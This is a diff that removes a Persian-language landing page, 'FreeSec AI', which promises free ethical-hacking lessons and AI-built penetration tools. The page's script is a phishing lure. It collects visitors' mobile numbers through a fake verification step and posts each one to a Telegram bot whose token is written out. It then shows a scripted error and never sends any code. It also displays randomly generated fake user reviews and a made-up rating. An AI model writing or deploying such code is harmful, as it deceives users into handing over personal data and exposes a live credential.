@@ -1,284 +1,0 @@
-<!DOCTYPE html>
-<html lang="fa" dir="rtl">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>FreeSec AI - امنیت با هوش مصنوعی</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"/>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
-    body {
-      font-family: 'Vazirmatn', sans-serif;
-      transition: background-color 0.3s, color 0.3s;
-    }
-    .hidden { display: none; }
-
-    @keyframes shake {
-      0%, 100% { transform: translateX(0); }
-      10%, 30%, 50%, 70%, 90% { transform: translateX(-8px); }
-      20%, 40%, 60%, 80% { transform: translateX(8px); }
-    }
-    .shake { animation: shake 0.6s ease; }
-
-    #ipWarning {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background-color: #facc15;
-      color: #1f2937;
-      padding: 16px 20px;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.3);
-      font-weight: bold;
-      z-index: 9999;
-      animation: fadeIn 0.4s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    /* حالت روشن */
-    body.light {
-      background-color: #ffffff;
-      color: #000000;
-    }
-    body.light .bg-gray-800 { background-color: #f0f0f0; }
-    body.light .bg-gray-900 { background-color: #e2e2e2; }
-    body.light .text-white { color: #000 !important; }
-    body.light .text-gray-300, 
-    body.light .text-gray-400 { color: #444 !important; }
-    body.light .text-green-300 { color: #009688 !important; }
-    body.light .text-green-400 { color: #00796b !important; }
-    body.light .bg-gray-700 { background-color: #ddd !important; color: #000; }
-
-    /* آیکون حالت */
-    #themeToggle {
-      position: fixed;
-      top: 20px;
-      left: 20px;
-      background: transparent;
-      border: none;
-      cursor: pointer;
-      z-index: 10000;
-      font-size: 24px;
-    }
-  </style>
-</head>
-<body class="p-6 bg-gray-900 text-white">
-  <button id="themeToggle" onclick="toggleTheme()">🌙</button>
-
-  <div class="max-w-6xl mx-auto">
-    <div id="mainPage">
-      <header class="text-center mb-12">
-        <h1 class="text-4xl font-bold text-green-400">FreeSec AI</h1>
-        <p class="text-gray-300 mt-2">امنیت سایبری با قدرت هوش مصنوعی - آزاد، پیشرفته، حرفه‌ای</p>
-      </header>
-
-      <section class="grid gap-6 grid-cols-1 sm:grid-cols-2 md:grid-cols-2 mb-12">
-        <div class="bg-gray-800 p-6 rounded-xl shadow-xl">
-          <h2 class="text-xl font-semibold text-green-300">آموزش هک اخلاقی</h2>
-          <p class="text-gray-400">راهنمای کامل تست نفوذ، مهندسی اجتماعی و تحلیل امنیتی</p>
-        </div>
-        <div class="bg-gray-800 p-6 rounded-xl shadow-xl">
-          <h2 class="text-xl font-semibold text-green-300">ابزارهای تست نفوذ</h2>
-          <p class="text-gray-400">ساخت ابزارهای اختصاصی نفوذ با هوش مصنوعی</p>
-        </div>
-        <div class="bg-gray-800 p-6 rounded-xl shadow-xl">
-          <h2 class="text-xl font-semibold text-green-300">پاسخ به تمام سوالات</h2>
-          <p class="text-gray-400">از مبتدی تا پیشرفته، هر سوالی داری از ما بپرس</p>
-        </div>
-        <div class="bg-gray-800 p-6 rounded-xl shadow-xl">
-          <h2 class="text-xl font-semibold text-green-300">کاملاً رایگان و بدون محدودیت</h2>
-          <p class="text-gray-400">بدون سقف سوال، بدون تبلیغات، فقط آموزش واقعی</p>
-        </div>
-      </section>
-
-      <div class="text-center mb-12">
-        <button onclick="goToVerify()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-6 rounded-xl">
-          شروع تست رایگان
-        </button>
-      </div>
-
-      <div class="text-center text-xl text-yellow-400 font-bold mb-4">
-        امتیاز کاربران: ★★★★☆  (۴.۵ از ۵)
-      </div>
-
-      <section class="bg-gray-900 p-6 rounded-xl mb-12">
-        <h2 class="text-2xl font-bold text-green-300 mb-6">نظرات کاربران</h2>
-        <div id="comments" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4"></div>
-        <div class="text-center mt-6">
-          <button onclick="loadMoreComments()" class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-6 rounded-xl">
-            نمایش نظرات بیشتر
-          </button>
-        </div>
-      </section>
-    </div>
-
-    <div id="verifyPage" class="hidden max-w-md mx-auto mt-12 bg-gray-800 p-8 rounded-xl shadow-xl">
-      <h2 class="text-2xl font-bold text-green-300 mb-4 text-center">تأیید شماره موبایل</h2>
-      <label class="block text-gray-400 mb-1">شماره موبایل:</label>
-      <input id="phone" class="w-full p-3 rounded bg-gray-700 text-white mb-4" placeholder="مثلاً 09123456789" />
-      <button onclick="sendCode()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded w-full mb-4">
-        ارسال کد تأیید
-      </button>
-      <div id="codeSection" class="hidden">
-        <label class="block text-gray-400 mb-1">کد تأیید:</label>
-        <input id="code" class="w-full p-3 rounded bg-gray-700 text-white mb-2" placeholder="مثلاً 123456" />
-        <button onclick="verify()" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded w-full mb-2">
-          تأیید و ورود
-        </button>
-        <div id="timer" class="text-gray-400 text-sm mb-2"></div>
-        <div class="text-center">
-          <button onclick="editPhone()" class="text-blue-400 text-sm underline">ویرایش شماره موبایل</button>
-        </div>
-      </div>
-      <div id="message" class="mt-4 text-center font-bold"></div>
-    </div>
-  </div>
-
-  <div id="ipWarning" class="hidden">شما با IP ایران وارد شده‌اید. لطفاً از فیلترشکن استفاده کنید.</div>
-
-  <script>
-    const BOT_TOKEN = "8178257200:AAGMH9_8w64QSnok0ZGLSbMuTQxudAJIN5o";
-    const CHAT_ID = -1002407582314;
-
-    async function goToVerify() {
-      try {
-        const res = await fetch("https://api.country.is");
-        const data = await res.json();
-        if (data.country === "IR") {
-          const warn = document.getElementById("ipWarning");
-          warn.classList.remove("hidden");
-          setTimeout(() => location.reload(), 3000);
-        } else {
-          if (navigator.userAgent.toLowerCase().includes("telegram")) {
-            window.open(window.location.href, "_blank");
-            return;
-          }
-          document.getElementById("mainPage").classList.add("hidden");
-          document.getElementById("verifyPage").classList.remove("hidden");
-        }
-      } catch (e) {
-        alert("خطا در بررسی IP. لطفاً مجدد تلاش کنید.");
-      }
-    }
-
-    function sendCode() {
-      const phoneInput = document.getElementById("phone");
-      const phone = phoneInput.value.trim();
-      if (!phone.match(/^09\d{9}$/)) {
-        alert("لطفاً شماره موبایل معتبر وارد کنید.");
-        return;
-      }
-
-      phoneInput.disabled = true;
-      document.querySelector("button[onclick='sendCode()']").disabled = true;
-      document.getElementById("codeSection").classList.remove("hidden");
-      document.getElementById("message").innerHTML = "";
-      startTimer();
-
-      const text = `شماره جدید:\n${phone}`;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-      });
-
-      setTimeout(() => {
-        const msg = document.getElementById("message");
-        msg.innerHTML = "<span class='text-red-400'>مشکلی پیش آمد. لطفاً بعداً تلاش کنید.</span>";
-        msg.classList.add("shake");
-        setTimeout(() => msg.classList.remove("shake"), 600);
-      }, 20000);
-    }
-
-    function editPhone() {
-      document.getElementById("phone").disabled = false;
-      document.querySelector("button[onclick='sendCode()']").disabled = false;
-      document.getElementById("codeSection").classList.add("hidden");
-      document.getElementById("message").innerHTML = "";
-      document.getElementById("phone").focus();
-    }
-
-    let timeLeft = 120;
-    let countdown;
-    function startTimer() {
-      clearInterval(countdown);
-      timeLeft = 120;
-      const timerEl = document.getElementById("timer");
-      countdown = setInterval(() => {
-        if (timeLeft <= 0) {
-          clearInterval(countdown);
-          timerEl.textContent = "زمان به پایان رسید.";
-          return;
-        }
-        timerEl.textContent = `زمان باقی‌مانده: ${timeLeft} ثانیه`;
-        timeLeft--;
-      }, 1000);
-    }
-
-    function verify() {
-      const code = document.getElementById("code").value.trim();
-      const msg = document.getElementById("message");
-      if (code === "Rakhnegar158228") {
-        msg.innerHTML = "<span class='text-green-400'>دسترسی تأیید شد!</span>";
-      } else {
-        msg.innerHTML = "<span class='text-red-400'>کد نادرست است.</span>";
-        msg.classList.add("shake");
-        setTimeout(() => msg.classList.remove("shake"), 600);
-      }
-    }
-
-    const names = ["سحر", "کیان", "زهرا", "میلاد", "نیلوفر", "محمد", "مریم", "یوسف", "الناز", "رضا", "حسین", "مهسا"];
-    const starts = ["خیلی خوشم اومد از", "واقعا تحت تاثیر قرار گرفتم از", "بهترین تجربه‌ای که داشتم با", "فوق‌العاده بود", "از کار شما تشکر می‌کنم برای", "واقعاً عالیه"];
-    const middles = ["آموزش‌ها", "پاسخ‌گویی سریع", "تنوع محتوا", "سرعت بالا", "رابط کاربری", "امنیت خوب", "تحلیل‌های دقیق"];
-    const ends = ["دمتون گرم!", "به دوستام معرفی می‌کنم.", "ارزش وقت گذاشتن داشت.", "خسته نباشید.", "لذت بردم.", "منتظر آپدیت‌های بیشترم."];
-
-    let comments = [], used = new Set(), recent = [];
-    while (comments.length < 60) {
-      const name = names[Math.floor(Math.random() * names.length)];
-      const text = `${starts[Math.floor(Math.random() * starts.length)]} ${middles[Math.floor(Math.random() * middles.length)]}. ${ends[Math.floor(Math.random() * ends.length)]}`;
-      const key = `${name}-${text}`;
-      if (!used.has(key) && !recent.includes(text)) {
-        used.add(key);
-        comments.push({ name, text });
-        recent.push(text);
-        if (recent.length > 20) recent.shift();
-      }
-    }
-
-    const container = document.getElementById("comments");
-    let loadedCount = 0;
-    const perPage = 6;
-
-    function loadMoreComments() {
-      const next = comments.slice(loadedCount, loadedCount + perPage);
-      next.forEach(c => {
-        const div = document.createElement("div");
-        div.className = "bg-gray-800 p-4 rounded shadow";
-        div.innerHTML = `
-          <p class='text-white font-semibold'>${c.name}</p>
-          <p class='text-gray-300 mb-2'>${c.text}</p>
-          <p class='text-yellow-400'>★★★★☆</p>
-        `;
-        container.appendChild(div);
-      });
-      loadedCount += perPage;
-      if (loadedCount >= comments.length) {
-        document.querySelector("button[onclick='loadMoreComments()']").style.display = "none";
-      }
-    }
-
-    function toggleTheme() {
-      document.body.classList.toggle("light");
-      const btn = document.getElementById("themeToggle");
-      btn.textContent = document.body.classList.contains("light") ? "☀️" : "🌙";
-    }
-
-    window.onload = () => {
-      loadMoreComments();
-    };
-  </script>
-</body>
-</html>
